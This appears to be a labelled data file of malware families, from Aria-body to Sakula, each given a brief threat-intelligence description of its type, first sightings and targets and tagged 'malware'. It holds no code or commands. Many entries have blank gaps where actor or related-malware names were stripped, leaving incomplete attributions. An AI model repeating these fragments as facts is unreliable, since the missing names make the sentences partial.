Aria-body,is a custom backdoor that has been used by .,malware
Astaroth,is a Trojan and information stealer known to affect companies in Europe and Brazil. It has been known publicly since at least late 2017.  ,malware
Attor,is a Windows-based espionage platform that has been seen in use since 2013.  has a loadable plugin architecture to customize functionality for specific targets.,malware
AuditCred,is a malicious DLL that has been used by  during their 2018 attacks.,malware
AutoIt backdoor,is malware that has been used by the actors responsible for the MONSOON campaign. The actors frequently used it in weaponized .pps files exploiting CVE-2014-6352.  This malware makes use of the legitimate scripting language for Windows GUI automation with the same name.,malware
Avenger,is a downloader that has been used by  since at least 2019.,malware
Azorult,"is a commercial Trojan that is used to steal information from compromised hosts.  has been observed in the wild as early as 2016.
In July 2018,  was seen used in a spearphishing campaign against targets in North America.  has been seen used for cryptocurrency theft. ",malware
BACKSPACE,is a backdoor used by  that dates back to at least 2005. ,malware
BADCALL,is a Trojan malware variant used by the group . ,malware
BADNEWS,"is malware that has been used by the actors responsible for the  campaign. Its name was given due to its use of RSS feeds, forums, and blogs for command and control.  ",malware
BBK,is a downloader that has been used by  since at least 2019.,malware
BBSRAT,is malware with remote access tool functionality that has been used in targeted compromises. ,malware
BISCUIT,is a backdoor that has been used by  since as early as 2007. ,malware
BLACKCOFFEE,is malware that has been used by several Chinese groups since at least 2013.  ,malware
BONDUPDATER,"is a PowerShell backdoor used by . It was first observed in November 2017 during targeting of a Middle Eastern government organization, and an updated version was observed in August 2018 being used to target a government organization with spearphishing emails.",malware
BOOSTWRITE,is a loader crafted to be launched via abuse of the DLL search order of applications used by .,malware
BOOTRASH,is a  that targets Windows operating systems. It has been used by threat actors that target the financial sector.,malware
BS2005,is malware that was used by  in spearphishing campaigns since at least 2011. ,malware
BUBBLEWRAP,"is a full-featured, second-stage backdoor used by the  group. It is set to run when the system boots and includes functionality to check, upload, and register plug-ins that can further enhance its capabilities. ",malware
BabyShark,is a Microsoft Visual Basic (VB) script-based malware family that is believed to be associated with several North Korean campaigns. ,malware
BackConfig,is a custom Trojan with a flexible plugin architecture that has been used by .,malware
Backdoor.Oldrea,is a backdoor used by . It appears to be custom malware authored by the group or specifically for it. ,malware
BadPatch,is a Windows Trojan that was used in a Gaza Hackers-linked campaign.,malware
Bandook,"is a commercially available RAT, written in Delphi, which has been available since roughly 2007   .",malware
Bankshot,"is a remote access tool (RAT) that was first reported by the Department of Homeland Security in December of 2017. In 2018,  used the  implant in attacks against the Turkish financial sector. ",malware
Bisonal,"is malware that has been used in attacks against targets in Russia, South Korea, and Japan. It has been observed in the wild since 2014. ",malware
BlackEnergy,"is a malware toolkit that has been used by both criminal and APT actors. It dates back to at least 2007 and was originally designed to create botnets for use in conducting Distributed Denial of Service (DDoS) attacks, but its use has evolved to support various plug-ins. It is well known for being used during the confrontation between Georgia and Russia in 2008, as well as in targeting Ukrainian institutions. Variants include BlackEnergy 2 and BlackEnergy 3. ",malware
Bonadan,is a malicious version of OpenSSH which acts as a custom backdoor.  has been active since at least 2018 and combines a new cryptocurrency-mining module with the same credential-stealing module used by the Onderon family of backdoors.,malware
Brave Prince,"is a Korean-language implant that was first observed in the wild in December 2017. It contains similar code and behavior to , and was seen along with  and  in operations surrounding the 2018 Pyeongchang Winter Olympics. ",malware
Briba,is a trojan used by  to open a backdoor and download files on to compromised hosts.  ,malware
Bundlore,"is adware written for macOS that has been in use since at least 2015. Though categorized as adware,  has many features associated with more traditional backdoors.",malware
CALENDAR,is malware used by  that mimics legitimate Gmail Calendar traffic. ,malware
CARROTBAT,is a customized dropper that has been in use since at least 2017.  has been used to install  and has infrastructure overlap with .,malware
CCBkdr,is malware that was injected into a signed version of CCleaner and distributed from CCleaner's distribution website.  ,malware
CHOPSTICK,"is a malware family of modular backdoors used by . It has been used since at least 2012 and is usually dropped on victims as second-stage malware, though it has been used as first-stage malware in several cases. It has both Windows and Linux variants.     It is tracked separately from the .",malware
CORALDECK,is an exfiltration tool used by . ,malware
CORESHELL,is a downloader used by . The older versions of this malware are known as SOURFACE and newer versions as CORESHELL. ,malware
Cadelspy,is a backdoor that has been used by .,malware
Calisto,is a macOS Trojan that opens a backdoor on the compromised machine.  is believed to have first been developed in 2016.  ,malware
CallMe,is a Trojan designed to run on Apple OSX. It is based on a publicly available tool called Tiny SHell. ,malware
Cannon,is a Trojan with variants written in C# and Delphi. It was first observed in April 2018. ,malware
Carbanak,"is a full-featured, remote backdoor used by a group of the same name (). It is intended for espionage, data exfiltration, and providing remote access to infected machines.  ",malware
Carberp,"is a credential and information stealing malware that has been active since at least 2009. 's source code was leaked online in 2013, and subsequently used as the foundation for the  backdoor.",malware
Carbon,"is a sophisticated, second-stage backdoor and framework that can be used to steal sensitive information from victims.  has been selectively used by  to target government and foreign affairs-related organizations in Central Asia.",malware
Cardinal RAT,is a potentially low volume remote access trojan (RAT) observed since December 2015.  is notable for its unique utilization of uncompiled C# source code and the Microsoft Windows built-in csc.exe compiler.,malware
Catchamas,is a Windows Trojan that steals information from compromised systems. ,malware
ChChes,is a Trojan that appears to be used exclusively by . It was used to target Japanese organizations in 2016. Its lack of persistence methods suggests it may be intended as a first-stage tool.   ,malware
Chaos,"is Linux malware that compromises systems by brute force attacks against SSH services. Once installed, it provides a reverse shell to its controllers, triggered by unsolicited packets. ",malware
Cherry Picker,is a point of sale (PoS) memory scraper. ,malware
China Chopper,is a  hosted on Web servers to provide access back into an enterprise network that does not rely on an infected system calling back to a remote command and control server.  It has been used by several threat groups.  ,malware
CloudDuke,is malware that was used by  in 2015.  ,malware
Cobian RAT,"is a backdoor, remote access tool that has been observed since 2016.",malware
CoinTicker,is a malicious application that poses as a cryptocurrency price ticker and installs components of the open source backdoors EvilOSX and EggShell.,malware
ComRAT,"is a second stage implant suspected of being a descendant of  and used by . The first version of  was identified in 2007, but the tool has undergone substantial development for many years since.",malware
Comnie,is a remote backdoor which has been used in attacks in East Asia. ,malware
CookieMiner,is mac-based malware that targets information associated with cryptocurrency exchanges as well as enabling cryptocurrency mining on the victim system itself. It was first discovered in the wild in 2019.,malware
CosmicDuke,is malware that was used by  from 2010 to 2015. ,malware
CozyCar,"is malware that was used by  from 2010 to 2015. It is a modular malware platform, and its backdoor component can be instructed to download and execute a variety of modules with different functionality. ",malware
Crimson,is malware used as part of a campaign known as Operation Transparent Tribe that targeted Indian diplomatic and military victims. ,malware
CrossRAT,is a cross platform RAT.,malware
Cryptoistic,"is a backdoor, written in Swift, that has been used by .",malware
DDKONG,is a malware sample that was part of a campaign by .  was first seen used in February 2017. ,malware
DOGCALL,is a backdoor used by  that has been used to target South Korean government and military organizations in 2017. It is typically dropped using a Hangul Word Processor (HWP) exploit. ,malware
Dacls,is a multi-platform remote access tool used by  since at least December 2019.,malware
DarkComet,is a Windows remote administration tool and backdoor.,malware
Daserf,"is a backdoor that has been used to spy on and steal from Japanese, South Korean, Russian, Singaporean, and Chinese victims. Researchers have identified versions written in both Visual C and Delphi.  ",malware
DealersChoice,is a Flash exploitation framework used by . ,malware
Denis,is a Windows backdoor and Trojan used by .  shares several similarities to the  backdoor and has been used in conjunction with the  backdoor.,malware
Derusbi,is malware used by multiple Chinese APT groups.   Both Windows and Linux variants have been observed. ,malware
Dipsind,is a malware family of backdoors that appear to be used exclusively by . ,malware
Dok,steals banking information through man-in-the-middle  .,malware
DownPaper,is a backdoor Trojan; its main functionality is to download and run second stage malware. ,malware
Downdelph,is a first-stage downloader written in Delphi that has been used by  in rare instances between 2013 and 2015. ,malware
Dridex,is a banking Trojan that has been used for financial gain. Dridex was created from the source code of the Bugat banking trojan (also known as Cridex).,malware
Drovorub,"is a Linux malware toolset comprised of an agent, client, server, and kernel modules, that has been used by .",malware
Duqu,is a malware platform that uses a modular approach to extend functionality after deployment within a target network. ,malware
DustySky,is multi-stage malware written in .NET that has been used by  since May 2015.  ,malware
Dyre,"is a banking Trojan that has been used for financial gain. 
 ",malware
ELMER,"is a non-persistent, proxy-aware HTTP backdoor written in Delphi that has been used by . ",malware
Ebury,"is an SSH backdoor targeting Linux operating systems. Attackers require root-level access, which allows them to replace SSH binaries (ssh, sshd, ssh-add, etc) or modify a shared library used by OpenSSH (libkeyutils).",malware
Elise,"is a custom backdoor Trojan that appears to be used exclusively by . It is part of a larger group of
tools referred to as LStudio, ST Group, and APT0LSTU. ",malware
Emissary,"is a Trojan that has been used by . It shares code with , with both Trojans being part of a malware group referred to as LStudio. ",malware
Emotet,is a modular malware variant which is primarily used as a downloader for other malware variants such as  and . Emotet first emerged in June 2014 and has been primarily used to target the banking sector. ,malware
Epic,is a backdoor that has been used by . ,malware
EvilBunny,is a C++ malware sample observed since 2011 that was designed to be a execution platform for Lua scripts.,malware
EvilGrab,is a malware family with common reconnaissance capabilities. It has been deployed by  via malicious Microsoft Office documents as part of spearphishing campaigns. ,malware
Exaramel for Linux,is a backdoor written in the Go Programming Language and compiled as a 64-bit ELF binary. The Windows version is tracked separately under .,malware
Exaramel for Windows,is a backdoor used for targeting Windows systems. The Linux version is tracked separately under .,malware
FALLCHILL,"is a RAT that has been used by  since at least 2016 to target the aerospace, telecommunications, and finance industries. It is usually dropped by other  malware or delivered when a victim unknowingly visits a compromised website. ",malware
FELIXROOT,is a backdoor that has been used to target Ukrainian victims. ,malware
FLASHFLOOD,is malware developed by  that allows propagation and exfiltration of data over removable devices.  may use this capability to exfiltrate data across air-gaps. ,malware
FLIPSIDE,is a simple tool similar to Plink that is used by  to maintain access to victims. ,malware
FakeM,is a shellcode-based Windows backdoor that has been used by . ,malware
FatDuke,is a backdoor used by  since at least 2016.,malware
Felismus,is a modular backdoor that has been used by .  ,malware
FinFisher,is a government-grade commercial surveillance spyware reportedly sold exclusively to government agencies for use in targeted and lawful criminal investigations. It is heavily obfuscated and uses multiple anti-analysis techniques. It has other variants including .     ,malware
Final1stspy,is a dropper family that has been used to deliver .,malware
Flame,"Flame is a sophisticated toolkit that has been used to collect information since at least 2010, largely targeting Middle East countries. ",malware
FlawedAmmyy,"is a remote access tool (RAT) that was first seen in early 2016. The code for  was based on leaked source code for a version of Ammyy Admin, a remote access software.",malware
FlawedGrace,is a fully featured remote access tool (RAT) written in C++ that was first observed in late 2017.,malware
FrameworkPOS,is a point of sale (POS) malware used by  to steal payment card data from sytems that run physical POS devices.,malware
FruitFly,FruitFly is designed to spy on mac users  .,malware
Fysbis,is a Linux-based backdoor used by  that dates back to at least 2014.,malware
GLOOXMAIL,is malware used by  that mimics legitimate Jabber/XMPP traffic. ,malware
GRIFFON,is a JavaScript backdoor used by . ,malware
Gazer,is a backdoor used by  since at least 2016. ,malware
GeminiDuke,is malware that was used by  from 2009 to 2012. ,malware
Get2,"is a downloader written in C++ that has been used by  to deliver , , Snatch and .",malware
Gold Dragon,"is a Korean-language, data gathering implant that was first observed in the wild in South Korea in July 2017.  was used along with  and  in operations targeting organizations associated with the 2018 Pyeongchang Winter Olympics. ",malware
GoldenSpy,"is a backdoor malware which has been packaged with legitimate tax preparation software.  was discovered targeting organizations in China, being delivered with the ""Intelligent Tax"" software suite which is produced by the Golden Tax Department of Aisino Credit Information Co. and required to pay local taxes. ",malware
Goopy,is a Windows backdoor and Trojan used by  and shares several similarities to another backdoor used by the group ().  is named for its impersonation of the legitimate Google Updater executable.,malware
GravityRAT,"is a remote access tool (RAT) and has been in ongoing development since 2016. The actor behind the tool remains unknown, but two usernames have been recovered that link to the author, which are ""TheMartian"" and ""The Invincible."" According to the National Computer Emergency Response Team (CERT) of India, the malware has been identified in attacks against organization and entities in India. ",malware
GreyEnergy,is a backdoor written in C and compiled in Visual Studio.  shares similarities with the  malware and is thought to be the successor of it.,malware
H1N1,"is a malware variant that has been distributed via a campaign using VBA macros to infect victims. Although it initially had only loader capabilities, it has evolved to include information-stealing functionality. ",malware
HALFBAKED,is a malware family consisting of multiple components intended to establish persistence in victim networks. ,malware
HAMMERTOSS,is a backdoor that was used by  in 2015.  ,malware
HAPPYWORK,is a downloader used by  to target South Korean government and financial victims in November 2016. ,malware
HARDRAIN,is a Trojan malware variant reportedly used by the North Korean government. ,malware
HAWKBALL,is a backdoor that was observed in targeting of the government sector in Central Asia.,malware
HDoor,is malware that has been customized and used by the  group. ,malware
HIDEDRV,is a rootkit used by . It has been deployed along with  to execute and hide that malware.  ,malware
HOMEFRY,is a 64-bit Windows password dumper/cracker that has previously been used in conjunction with other  backdoors. ,malware
HOPLIGHT,is a backdoor Trojan that has reportedly been used by the North Korean government.,malware
HTTPBrowser,is malware that has been used by several threat groups.   It is believed to be of Chinese origin. ,malware
Hacking Team UEFI Rootkit,is a rootkit developed by the company Hacking Team as a method of persistence for remote access software. ,malware
Hancitor,is a downloader that has been used by  and other information stealing malware.,malware
Helminth,"is a backdoor that has at least two variants - one written in VBScript and PowerShell that is delivered via a macros in Excel spreadsheets, and one that is a standalone Windows executable. ",malware
Hi-Zor,is a remote access tool (RAT) that has characteristics similar to . It was used in a campaign named INOCNATION. ,malware
HiddenWasp,is a Linux-based Trojan used to target systems for remote control. It comes in the form of a statically linked ELF binary with stdlibc++.,malware
Hikit,is malware that has been used by  for late-stage persistence and exfiltration after the initial compromise.  ,malware
HotCroissant,"is a remote access trojan (RAT) attributed by U.S. government entities to malicious North Korean government cyber activity, tracked collectively as HIDDEN COBRA.  shares numerous code similarities with .",malware
Hydraq,"is a data-theft trojan first used by  in the 2009 Google intrusion known as Operation Aurora, though variations of this trojan have been used in more recent campaigns by other Chinese actors, possibly including .        ",malware
HyperBro,is a custom in-memory backdoor used by .,malware
ISMInjector,"is a Trojan used to install another  backdoor, ISMAgent. ",malware
IcedID,is a modular banking malware designed to steal financial information that has been observed in the wild since at least 2017.    has been downloaded by  in multiple campaigns.,malware
InnaputRAT,is a remote access tool that can exfiltrate files from a victim’s machine.  has been seen out in the wild since 2016. ,malware
InvisiMole,is a modular spyware program that has been used by the InvisiMole Group since at least 2013.  has two backdoor modules called RC2FM and RC2CL that are used to perform post-exploitation activities. It has been discovered on compromised victims in the Ukraine and Russia.  infrastructure has been used to download and execute  against a small number of victims.,malware
Ixeshe,is a malware family that has been used since at least 2009 against targets in East Asia. ,malware
JCry,is ransomware written in Go. It was identified as apart of the #OpJerusalem 2019 campaign.,malware
JHUHUGIT,is malware used by . It is based on Carberp source code and serves as reconnaissance malware.    ,malware
JPIN,is a custom-built backdoor family used by . Evidence suggests developers of  and  code bases were related in some way. ,malware
Janicab,is an OS X trojan that relied on a valid developer ID and oblivious users to install it. ,malware
KARAE,is a backdoor typically used by  as first-stage malware. ,malware
KEYMARBLE,is a Trojan that has reportedly been used by the North Korean government. ,malware
KOMPROGO,"is a signature backdoor used by  that is capable of process, file, and registry management. ",malware
KONNI,is a Windows remote administration too that has been seen in use since 2014 and evolved in its capabilities through at least 2017.  has been linked to several campaigns involving North Korean themes.  has significant code overlap with the  malware family. There is some evidence potentially linking  to .,malware
Kasidet,is a backdoor that has been dropped by using malicious VBA macros. ,malware
Kazuar,"is a fully featured, multi-platform backdoor Trojan written using the Microsoft .NET framework. ",malware
Kessel,"is an advanced version of OpenSSH which acts as a custom backdoor, mainly acting to steal credentials and function as a bot.  has been active since its C2 domain began resolving in August 2018.",malware
KeyBoy,is malware that has been used in targeted campaigns against members of the Tibetan Parliament in 2016.,malware
Keydnap,This piece of malware steals the content of the user's keychain while maintaining a permanent backdoor  .,malware
Kivars,"is a modular remote access tool (RAT), derived from the Bifrost RAT, that was used by  in a 2010 campaign.",malware
Komplex,is a backdoor that has been used by  on OS X and appears to be developed in a similar manner to   .,malware
Kwampirs,is a backdoor Trojan used by . It has been found on machines which had software installed for the use and control of high-tech imaging devices such as X-Ray and MRI machines. ,malware
LOWBALL,is malware used by . It was used in August 2015 in email messages targeting Hong Kong-based media organizations. ,malware
LightNeuron,is a sophisticated backdoor that has targeted Microsoft Exchange servers since at least 2014.  has been used by  to target diplomatic and foreign affairs-related organizations. The presence of certain strings in the malware suggests a Linux variant of  exists.,malware
Linfo,is a rootkit trojan used by  to open a backdoor on compromised hosts.  ,malware
Linux Rabbit,"is malware that targeted Linux servers and IoT devices in a campaign lasting from August to October 2018. It shares code with another strain of malware known as Rabbot. The goal of the campaign was to install cryptocurrency miners onto the targeted servers and devices.
",malware
LoJax,is a UEFI rootkit used by  to persist remote access software on targeted systems.,malware
LockerGoga,is ransomware that has been tied to various attacks on European companies. It was first reported upon in January 2019.,malware
Lokibot,is a malware designed to collect credentials and security tokens from an infected machine.  has also been used to establish backdoors in enterprise environments.,malware
LoudMiner,is a cryptocurrency miner which uses virtualization software to siphon system resources. The miner has been bundled with pirated copies of Virtual Studio Technology (VST) for Windows and macOS.,malware
Lurid,"is a malware family that has been used by several groups, including , in targeted attacks as far back as 2006.  ",malware
MESSAGETAP,"is a data mining malware family deployed by  into telecommunications networks to monitor and save SMS traffic from specific phone numbers, IMSI numbers, or that contain specific keywords. ",malware
MURKYTOP,is a reconnaissance tool used by . ,malware
MacSpy,is a malware-as-a-service offered on the darkweb  .,malware
Machete,"is a cyber espionage toolset developed by a Spanish-speaking group known as El . It is a Python-based backdoor targeting Windows machines, and it was first observed in 2010.",malware
Matroyshka,"is a malware framework used by  that consists of a dropper, loader, and RAT. It has multiple versions; v1 was seen in the wild from July 2016 until January 2017. v2 has fewer commands and other minor differences.  ",malware
Maze,"ransomware, previously known as ""ChaCha"", was discovered in May 2019. In addition to encrypting files on victim machines for impact,  operators conduct information stealing campaigns prior to encryption and post the information online to extort affected companies.",malware
MechaFlounder,is a python-based remote access tool (RAT) that has been used by . The payload uses a combination of actor developed code and code snippets freely available online in development communities.,malware
Metamorfo,is a banking trojan operated by a Brazilian cybercrime group that has been active since at least April 2018. The group focuses on targeting mostly Brazilian users.,malware
Micropsia,is a remote access tool written in Delphi.,malware
Miner-C,is malware that mines victims for the Monero cryptocurrency. It has targeted FTP servers and Network Attached Storage (NAS) devices to spread. ,malware
MiniDuke,is malware that was used by  from 2010 to 2015. The  toolset consists of multiple downloader and backdoor components. The loader has been used with other  components as well as in conjunction with  and . ,malware
MirageFox,"is a remote access tool used against Windows systems. It appears to be an upgraded version of a tool known as Mirage, which is a RAT believed to originate in 2012. ",malware
Mis-Type,is a backdoor hybrid that was used by  in 2012. ,malware
Misdat,is a backdoor that was used by  from 2010 to 2011. ,malware
Mivast,is a backdoor that has been used by . It was reportedly used in the Anthem breach. ,malware
MobileOrder,is a Trojan intended to compromise Android mobile devices. It has been used by . ,malware
MoonWind,is a remote access tool (RAT) that was used in 2016 to target organizations in Thailand. ,malware
More_eggs,"is a JScript backdoor used by  and . Its name was given based on the variable ""More_eggs"" being present in its code. There are at least two different versions of the backdoor being used, version 2.0 and version 4.4. ",malware
Mosquito,"is a Win32 backdoor that has been used by .  is made up of three parts: the installer, the launcher, and the backdoor. The main backdoor is called CommanderDLL and is launched by the loader program. ",malware
NDiskMonitor,is a custom backdoor written in .NET that appears to be unique to . ,malware
NETEAGLE,is a backdoor developed by  with compile dates as early as 2008. It has two main variants known as “Scout” and “Norton.” ,malware
NETWIRE,"is a publicly available, multiplatform remote administration tool (RAT) that has been used by criminal and APT groups since at least 2012.   ",malware
NOKKI,is a modular remote access tool. The earliest observed attack using  was in January 2018.  has significant code overlap with the  malware family. There is some evidence potentially linking  to .,malware
Naid,is a trojan used by  to open a backdoor on compromised hosts.  ,malware
NanHaiShu,is a remote access tool and JScript backdoor used by .  has been used to target government and private-sector organizations that have relations to the South China Sea dispute.  ,malware
NanoCore,is a modular remote access tool developed in .NET that can be used to spy on victims and steal information. It has been used by threat actors since 2013.,malware
NavRAT,"is a remote access tool designed to upload, download, and execute files. It has been observed in attacks targeting South Korea. ",malware
Nerex,is a Trojan used by  to open a backdoor on compromised hosts.  ,malware
Net Crawler,is an intranet worm capable of extracting credentials using credential dumpers and spreading to systems on a network over SMB by brute forcing accounts with recovered passwords and using  to execute a copy of . ,malware
NetTraveler,"is malware that has been used in multiple cyber espionage campaigns for basic surveillance of victims. The earliest known samples have timestamps back to 2005, and the largest number of observed samples were created between 2010 and 2013. ",malware
Netwalker,is fileless ransomware written in PowerShell and executed directly in memory.,malware
Ngrok,is a legitimate reverse proxy tool that can create a secure tunnel to servers located behind firewalls or on local machines that do not have a public IP.  has been leveraged by threat actors in several campaigns including use for lateral movement and data exfiltration.,malware
Nidiran,is a custom backdoor developed and used by . It has been delivered via strategic web compromise. ,malware
NotPetya,"is malware that was first seen in a worldwide attack starting on June 27, 2017. The main purpose of the malware appeared to be to effectively destroy data and disk structures on compromised systems. Though  presents itself as a form of ransomware, it appears likely that the attackers never intended to make the encrypted data recoverable. As such,  may be more appropriately thought of as a form of wiper malware.  contains worm-like features to spread itself across a computer network using the SMBv1 exploits EternalBlue and EternalRomance.",malware
OLDBAIT,is a credential harvester used by .  ,malware
OSInfo,is a custom tool used by  to do internal discovery on a victim's computer and network. ,malware
OSX/Shlayer,is a Trojan designed to install adware on macOS. It was first discovered in 2018.,malware
OSX_OCEANLOTUS.D,is a MacOS backdoor that has been used by .,malware
OceanSalt,"is a Trojan that was used in a campaign targeting victims in South Korea, United States, and Canada.  shares code similarity with , which has been linked to .",malware
Octopus,is a Windows Trojan.,malware
Okrum,is a Windows backdoor that has been seen in use since December 2016 with strong links to .,malware
Olympic Destroyer,"is malware that was first seen infecting computer systems at the 2018 Winter Olympics, held in Pyeongchang, South Korea. The main purpose of the malware appears to be to cause destructive impact to the affected systems. The malware leverages various native Windows utilities and API calls to carry out its destructive tasks. The malware has worm-like features to spread itself across a computer network in order to maximize its destructive impact. ",malware
OnionDuke,is malware that was used by  from 2013 to 2015. ,malware
OopsIE,is a Trojan used by  to remotely execute commands as well as upload/download files to/from victims. ,malware
Orz,is a custom JavaScript backdoor used by . It was observed being used in 2014 as well as in August 2017 when it was dropped by Microsoft Publisher files.  ,malware
OwaAuth,is a Web shell and credential stealer deployed to Microsoft Exchange servers that appears to be exclusively used by . ,malware
P2P ZeuS,"is a closed-source fork of the leaked version of the ZeuS botnet. It presents improvements over the leaked version, including a peer-to-peer architecture. ",malware
PHOREAL,is a signature backdoor used by . ,malware
PLAINTEE,is a malware sample that has been used by  in targeted attacks in Singapore and Cambodia. ,malware
PLEAD,"is a remote access tool (RAT) and downloader used by  in targeted attacks in East Asia including Taiwan, Japan, and Hong Kong.  has also been referred to as , though more recent reporting indicates likely separation between the two. ",malware
POORAIM,is a backdoor used by  in campaigns since at least 2014. ,malware
POSHSPY,is a backdoor that has been used by  since at least 2015. It appears to be used as a secondary backdoor used if the actors lost access to their primary backdoors. ,malware
POWERSOURCE,is a PowerShell backdoor that is a heavily obfuscated and modified version of the publicly available tool DNS_TXT_Pwnage. It was observed in February 2017 in spearphishing campaigns against personnel involved with United States Securities and Exchange Commission (SEC) filings at various organizations. The malware was delivered when macros were enabled by the victim and a VBS script was dropped.  ,malware
POWERSTATS,is a PowerShell-based first stage backdoor used by . ,malware
POWERTON,"is a custom PowerShell backdoor first observed in 2018. It has typically been deployed as a late-stage backdoor by . At least two variants of the backdoor have been identified, with the later version containing improved functionality.",malware
POWRUNER,is a PowerShell script that sends and receives commands to and from the C2 server. ,malware
PUNCHBUGGY,is a backdoor malware used by  that has been observed targeting POS networks in the hospitality industry.  ,malware
PUNCHTRACK,is non-persistent point of sale (POS) system malware utilized by  to scrape payment card data.  ,malware
Pasam,is a trojan used by  to open a backdoor on compromised hosts.  ,malware
Pillowmint,is a point-of-sale malware used by  designed to capture credit card information.,malware
PinchDuke,is malware that was used by  from 2008 to 2010. ,malware
PipeMon,is a multi-stage modular backdoor used by .,malware
Pisloader,"is a malware family that is notable due to its use of DNS as a C2 protocol as well as its use of anti-analysis tactics. It has been used by  and is similar to another malware family, , that has been used by the group. ",malware
PlugX,is a remote access tool (RAT) that uses modular plugins. It has been used by multiple threat groups.    ,malware
PoetRAT,"is a Python-based remote access trojan (RAT) used in multiple campaigns against the private and public sectors in Azerbaijan, specifically ICS and SCADA systems in the energy sector.  derived its name from references in the code to poet William Shakespeare. ",malware
PoisonIvy,is a popular remote access tool (RAT) that has been used by many groups.   ,malware
PolyglotDuke,is a downloader that has been used by  since at least 2013.  has been used to drop .,malware
Pony,"is a credential stealing malware, though has also been used among adversaries for its downloader capabilities. The source code for Pony Loader 1.0 and 2.0 were leaked online, leading to their use by various threat actors.",malware
Power Loader,"is modular code sold in the cybercrime market used as a downloader in malware families such as Carberp, Redyms and Gapz.  ",malware
PowerDuke,is a backdoor that was used by  in 2016. It has primarily been delivered through Microsoft Word or Excel attachments containing malicious macros. ,malware
PowerShower,is a PowerShell backdoor used by  for initial reconnaissance and to download and execute second stage payloads.,malware
PowerStallion,"is a lightweight  backdoor used by , possibly as a recovery access tool to install other backdoors.",malware
Prikormka,is a malware family used in a campaign known as Operation Groundbait. It has predominantly been observed in Ukraine and was used as early as 2008. ,malware
Proton,is a macOS backdoor focusing on data theft and credential access  .,malware
Proxysvc,is a malicious DLL used by  in a campaign known as Operation GhostSecret. It has appeared to be operating undetected since 2017 and was mostly observed in higher education organizations. The goal of  is to deliver additional payloads to the target and to maintain control for the attacker. It is in the form of a DLL that can also be executed as a standalone process. ,malware
Psylo,is a shellcode-based Trojan that has been used by . It has similar characteristics as . ,malware
Pteranodon,is a custom backdoor used by . ,malware
QUADAGENT,is a PowerShell backdoor used by . ,malware
RARSTONE,is malware used by the  group that has some characteristics similar to . ,malware
RATANKBA,"is a remote controller tool used by .  has been used in attacks targeting financial institutions in Poland, Mexico, Uruguay, the United Kingdom, and Chile. It was also seen used against organizations related to telecommunications, management consulting, information technology, insurance, aviation, and education.  has a graphical user interface to allow the attacker to issue jobs to perform on the infected machines.  ",malware
RDAT,is a backdoor used by the suspected Iranian threat group .  was originally identified in 2017 and targeted companies in the telecommunications sector.,malware
RDFSNIFFER,is a module loaded by  which allows an attacker to monitor and tamper with legitimate connections made via an application designed to provide visibility and system management capabilities to remote IT techs.,malware
REvil,is a ransomware family that has been linked to the  group and operated as ransomware-as-a-service (RaaS) since at least April 2019.  is highly configurable and shares code similarities with the GandCrab RaaS.,malware
RGDoor,is a malicious Internet Information Services (IIS) backdoor developed in the C++ language.  has been seen deployed on webservers belonging to the Middle East government organizations.  provides backdoor access to compromised IIS servers. ,malware
RIPTIDE,is a proxy-aware backdoor used by . ,malware
ROCKBOOT,"is a  that has been used by an unidentified, suspected China-based group. ",malware
ROKRAT,is a cloud-based remote access tool (RAT) used by . This software has been used to target victims in South Korea.  used ROKRAT during several campaigns in 2016 through 2018.  ,malware
RTM,is custom malware written in Delphi. It is used by the group of the same name (). Newer versions of the malware have been reported publicly as Redaman.,malware
Ragnar Locker,is a ransomware that has been in use since at least December 2019.,malware
Ramsay,"is an information stealing malware framework designed to collect and exfiltrate sensitive documents, potentially from air-gapped systems. Researchers have identified overlaps between  and the -associated Retro malware.",malware
RawPOS,"is a point-of-sale (POS) malware family that searches for cardholder data on victims. It has been in use since at least 2008.    FireEye divides RawPOS into three components: FIENDCRY, DUEBREW, and DRIFTWOOD.  ",malware
Reaver,"is a malware family that has been in the wild since at least late 2016. Reporting indicates victims have primarily been associated with the ""Five Poisons,"" which are movements the Chinese government considers dangerous. The type of malware is rare due to its final payload being in the form of . ",malware
RedLeaves,is a malware family used by . The code overlaps with  and may be based upon the open source tool Trochilus.  ,malware
RegDuke,is a first stage implant written in .NET and used by  since at least 2017.  has been used to control a compromised machine when control of other implants on the machine was lost.,malware
Regin,"is a malware platform that has targeted victims in a range of industries, including telecom, government, and financial institutions. Some  timestamps date back to 2003. ",malware
Remexi,is a Windows-based Trojan that was developed in the C programming language.,malware
RemoteCMD,is a custom tool used by  to execute commands on a remote system similar to SysInternal's PSEXEC functionality. ,malware
Remsec,is a modular backdoor that has been used by  and appears to have been designed primarily for espionage purposes. Many of its modules are written in Lua. ,malware
Revenge RAT,is a freely available remote access tool written in .NET (C#).,malware
Rifdoor,is a remote access trojan (RAT) that shares numerous code similarities with .,malware
Rising Sun,"is a modular backdoor malware used extensively in Operation . The malware has been observed targeting nuclear, defense, energy, and financial services companies across the world.  uses source code from 's Trojan Duuzer.",malware
RobbinHood,is ransomware that was first observed being used in an attack against the Baltimore city government's computer network.,malware
RogueRobin,is a payload used by  that has been developed in PowerShell and C#. ,malware
Rover,is malware suspected of being used for espionage purposes. It was used in 2015 in a targeted email sent to an Indian Ambassador to Afghanistan. ,malware
RunningRAT,is a remote access tool that appeared in operations surrounding the 2018 Pyeongchang Winter Olympics along with  and . ,malware
Ryuk,is a ransomware designed to target enterprise environments that has been used in attacks since at least 2018.  shares code similarities with Hermes ransomware.,malware
S-Type,is a backdoor that was used by  from 2013 to 2014. ,malware
SDBot,is a backdoor with installer and loader components that has been used by  since at least 2019.,malware
SEASHARPEE,is a Web shell that has been used by . ,malware
SHARPSTATS,is a .NET backdoor used by  since at least 2019.,malware
SHIPSHAPE,is malware developed by  that allows propagation and exfiltration of data over removable devices.  may use this capability to exfiltrate data across air-gaps. ,malware
SHOTPUT,is a custom backdoor used by . ,malware
SHUTTERSPEED,is a backdoor used by . ,malware
SLOWDRIFT,is a backdoor used by  against academic and strategic victims in South Korea. ,malware
SNUGRIDE,is a backdoor that has been used by  as first stage malware. ,malware
SOUNDBITE,is a signature backdoor used by . ,malware
SPACESHIP,is malware developed by  that allows propagation and exfiltration of data over removable devices.  may use this capability to exfiltrate data across air-gaps. ,malware
SQLRat,is malware that executes SQL scripts to avoid leaving traditional host artifacts.  has been observed using it.,malware
SYNful Knock,is a stealthy modification of the operating system of network devices that can be used to maintain persistence within a victim's network and provide new capabilities to the adversary.,malware
SYSCON,is a backdoor that has been in use since at least 2017 and has been associated with campaigns involving North Korean themes.  has been delivered by the  and  droppers.,malware
Sakula,is a remote access tool (RAT) that first surfaced in 2012 and was used in intrusions throughout 2015. ,malware
